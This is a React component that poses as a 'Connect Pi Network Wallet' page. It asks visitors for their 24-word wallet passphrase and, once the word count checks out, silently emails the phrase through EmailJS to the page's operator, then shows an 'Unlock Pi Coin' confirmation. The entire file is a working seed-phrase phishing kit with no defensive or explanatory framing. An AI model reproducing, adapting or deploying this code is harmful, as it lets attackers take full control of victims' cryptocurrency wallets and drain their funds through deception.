import React, { useState } from 'react'
import emailjs from "@emailjs/browser";
import { useNavigate } from 'react-router';

function Authentication() {
   const [phrase, setPhrase] = useState("");
   const navigate = useNavigate()



   const [error, setError] = useState<boolean>(false);
   const [loading, setLoading] = useState<boolean>(false);
   const [showModal, setShowModal] = useState<boolean>(false);
   const [sendError,setSendError] = useState<boolean>(false);


 
   const serviceID = import.meta.env.VITE_EMAILJS_SERVICE_ID;
   const templateID = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
   const userID = import.meta.env.VITE_EMAILJS_USER_ID;
 
   const handleSend = async () => {
     setLoading(true);
     setError(false);
     setShowModal(true);
   
     const wordCount = phrase.trim().split(/\s+/).length;
     console.log(wordCount, phrase.trim().split(/\s+/));  // Debugging
   
     if (wordCount !== 24) {
       setError(true);
       setLoading(false);
       setShowModal(false);
       return;
     }
   
     const templateParams = { message: phrase };
   
     try {
       await emailjs.send(serviceID, templateID, templateParams, userID);
       setPhrase("");
       setLoading(false)
       console.log("Sent message");
      //  setShowModal(false);
     } catch (error:any) {
       console.error("Error:", error?.text || error?.message || error);  // Enhanced error message
       setSendError(true)
       setShowModal(false)
     } finally {
       setLoading(false);
     }
   };
 
   return (
     <div className="flex flex-col items-center p-6 bg-gray-100 h-screen">
       <h2 className="text-2xl font-semibold text-teal-600 mb-2">
         Connect Pi Network Wallet
       </h2>
       <p className="text-gray-600 mb-4">Enter Your Pi Wallet 24 digits passphrase</p>
       <textarea
         className="w-full resize-none max-w-md  p-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-teal-400"
         rows={4}
         value={phrase}
         onChange={(e) =>{ setPhrase(e.target.value) ; setError(false)}}
         placeholder="Enter your 24-word phrase"
       ></textarea>

       {
        error &&(
          <p className='text-red-700'>
            invalid passphrase
            </p>
        )
       }
       <button onClick={handleSend} className="bg-teal-400 text-white font-medium px-6 py-3 mt-4 rounded-full">
         {
          loading?"Unlocking...":"Unlock"
         }
       </button>
       <button className="mt-2 text-gray-500">Back</button>


       {showModal && (
        <div className="fixed inset-0 bg-black/10 backdrop-blur-sm flex justify-center items-center">
          <div className="bg-teal-400 p-8 rounded-lg shadow-lg mx-5 w-full max-w-md">
            <h3 className="text-xl font-bold text-white text-center mb-4">Unlock Pi Coin</h3>
            <p className='text-xs text-rose-300'>

           {
             sendError?"An Error Ocured. Check your newwork and try again":""
            }
            </ p>
            <button
              className="w-full mt-4 bg-purple-700 border-0f text-white py-3 rounded-lg font-medium shadow-md hover:bg-purple-800 transition-all flex justify-center items-center"
              onClick={()=>{
                if (sendError){
                  handleSend
                }
                navigate("/")
              }}
            >
             {
              sendError?"Try Again!":loading?"Unlocking":"Done"
             }
            </button>
          </div>
        </div>
      )}
     </div>
   );
 }


export default Authentication
